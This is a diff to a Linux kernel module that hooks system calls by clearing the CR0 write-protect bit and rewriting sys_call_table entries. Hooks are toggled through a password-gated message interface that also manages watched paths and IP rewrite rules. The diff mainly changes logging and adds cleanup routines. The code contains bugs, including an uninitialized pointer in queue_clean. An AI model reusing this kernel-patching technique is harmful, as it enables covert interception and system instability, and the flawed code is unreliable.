@@ -10,12 +10,39 @@ MODULE_DESCRIPTION("hook sys_open");
 
 struct hook_data *hook_dev;
 
-void disable_write_protect(void)
+#include "messagepro.h"
+#include "ngx_queue.h"
+
+static int queue_clean(ngx_queue_t *queue,clean_fun f)
+{
+    ngx_queue_t  *q, *next;
+
+	if (!queue || !f) {
+		return -1;
+	}
+
+	//只有头节点
+    if (q == ngx_queue_last(queue)) {
+        return 0;
+    }
+	//遍历节点
+    for (q = ngx_queue_head(queue); q != ngx_queue_sentinel(queue); q = next) {
+
+        next = ngx_queue_next(q);
+		//删除当前遍历的节点
+        ngx_queue_remove(q);
+		f(q);
+    }
+
+	return 0;
+}
+
+static void disable_write_protect(void)
 {
 	write_cr0(read_cr0() & (~0x10000));
 }
 
-void enable_write_protect(void)
+static void enable_write_protect(void)
 {
 	write_cr0(read_cr0() | 0x10000);   
 }
@@ -37,7 +64,6 @@ static int obtain_sys_call_table_addr(void **sys_call_table_addr)
 
 static int init_hook_init(struct hook_ctx *ctx)
 {
-	printk("init_hook_init start\n");
 
 	if (ctx == NULL) {
 		return -1;
@@ -50,20 +76,14 @@ static int init_hook_init(struct hook_ctx *ctx)
 	memset(srctable(ctx),0,tablesize);
 	memset(objtable(ctx),0,tablesize);
 
-	printk("init_hook_init endl\n");
-
 	return 0;
 }
 
 static int install_hook(struct hook_ctx *ctx,unsigned int syscallnum,void *function)
 {
-	printk("install_hook start\n");
 	if (ctx == NULL) {
 		return -1;
 	}
-
-	//save src function
-	printk("install hook call \n");
 
 	srctable(ctx)[syscallnum] = systable(ctx)[syscallnum];
 	objtable(ctx)[syscallnum] = function;
@@ -72,7 +92,7 @@ static int install_hook(struct hook_ctx *ctx,unsigned int syscallnum,void *funct
 	systable(ctx)[syscallnum] = function;
 	enable_write_protect();
 
-	printk("install_hook endl\n");
+	printk("hook sysnum = %d\n",syscallnum);
 
 	return 0;
 }
@@ -122,7 +142,6 @@ static int do_login(struct message_login *login)
 		return 0;
 	}
 	
-	printk("login start\n");
 	if (!strcmp(login->user,HOOK_USER) && !strcmp(login->passwd,HOOK_PASSWD)) {
 		hook_dev->islogin = 1;
 		printk("login succeed\n");
@@ -140,7 +159,6 @@ static int do_hook(struct message_hook *hk)
 		return -1;
 	}
 
-	printk("hook start num = %d\n",hk->sysnum);
 	if (hk->sysnum < 0 || hk->sysnum >= NR_syscalls) {
 		return -1;
 	}
@@ -148,17 +166,23 @@ static int do_hook(struct message_hook *hk)
 	for (i = 0;hook_modules[i];i++) {
 		//printk("--%d * %d--\n",hk->sysnum,hook_modules[i]->syscallnum);
 		if (hk->sysnum == hook_modules[i]->syscallnum) {
-			ret = hk->ishook ? install_hook(&hook_dev->hctx,hk->sysnum,hook_modules[i]->hook_function) : uninstall_hook(&hook_dev->hctx,hk->sysnum);
+			if (hk->ishook) {
+				ret = install_hook(&hook_dev->hctx,hk->sysnum,hook_modules[i]->hook_function);
+				printk("hook start num = %d %s->%s\n",hk->sysnum,__FILE__,__FUNCTION__);
+			} else {
+				ret = uninstall_hook(&hook_dev->hctx,hk->sysnum);
+				printk("unhook start num = %d %s->%s\n",hk->sysnum,__FILE__,__FUNCTION__);
+			}
 			break;
 		}
 	}
 
 	if (!hook_modules[i]) {
-		printk("no hook function\n");
+		printk("no hook function %s->%s\n",__FILE__,__FUNCTION__);
 	}
 	
 	if (!ret) {
-		printk("hook succeed\n");
+		printk("hook succeed %s->%s\n",__FILE__,__FUNCTION__);
 		return -1;
 	}
 
@@ -182,7 +206,7 @@ static int do_path(struct message_path *path)
 		}
 		
 		memcpy(lpa->path,path->path,PATHMAX);
-		//printk("%s %s\n",lpa->path,path->path);
+		printk("%s %s\n",lpa->path,path->path);
 		ngx_queue_insert_head(&hook_dev->paths, &lpa->queue_node);
 	} else {
 		q = &hook_dev->paths;
@@ -198,6 +222,7 @@ static int do_path(struct message_path *path)
 			return 0;
 		}
 
+		printk("delete path : %s\n",lpa->path);
 		ngx_queue_remove(&lpa->queue_node);
 		kfree(lpa);
 	}
@@ -233,10 +258,11 @@ static int do_rewrite(struct message_rewrite *rewrite){
 		} 
 		
 		if (q == ngx_queue_sentinel(&hook_dev->addrs)) {
-			printk("no path\n");
+			printk("no rewrite\n");
 			return 0;
 		}
 
+		printk("delete srcip : %s\n",la->srcip);
 		ngx_queue_remove(&la->queue_node);
 		kfree(la);
 	}
@@ -264,11 +290,7 @@ static int message_parse(struct messagepro *pro)
 
 static int hooked_open(struct inode *inode, struct file *filp)
 {
-	printk("hook_open start\n");
-
 	init_hook_init(&hook_dev->hctx);
-
-	printk("hook_open endl\n");
 
 	return 0;
 }
@@ -338,9 +360,55 @@ static unsigned int hooked_poll(struct file *filp, struct poll_table_struct *wai
 	return mask;
 }
 
+static int clean_paths(ngx_queue_t *q)
+{
+	struct listen_path *la = ngx_queue_data(q,struct listen_path,queue_node);
+	if (la == NULL) {
+		printk("data = null %s -> %s",__FILE__,__FUNCTION__);
+		return -1;
+	}
+
+	printk("remove %s\n",la->path);
+	kfree(la);
+
+	return 0;
+}
+
+static int clean_addrs(ngx_queue_t *q)
+{
+	struct listen_addr *la = ngx_queue_data(q,struct listen_addr,queue_node);
+	if (la == NULL) {
+		printk("data = null %s -> %s",__FILE__,__FUNCTION__);
+		return -1;
+	}
+
+	printk("remove %s\n",la->srcip);
+	kfree(la);
+
+	return 0;
+}
+
+static int clean_logs(ngx_queue_t *q)
+{
+	struct log_data *la = ngx_queue_data(q,struct log_data,queue_node);
+	if (la == NULL) {
+		printk("data = null %s -> %s",__FILE__,__FUNCTION__);
+		return -1;
+	}
+
+	printk("remove %s\n",la->addr);
+	kfree(la);
+
+	return 0;
+}
+
 static int hooked_close(struct inode *inode, struct file *filp)
 {
 	uninit_hook_init(&hook_dev->hctx);
+	queue_clean(&hook_dev->paths,clean_paths);
+	queue_clean(&hook_dev->addrs,clean_addrs);
+	queue_clean(&hook_dev->logs ,clean_logs);
+
 	return 0;
 }
 
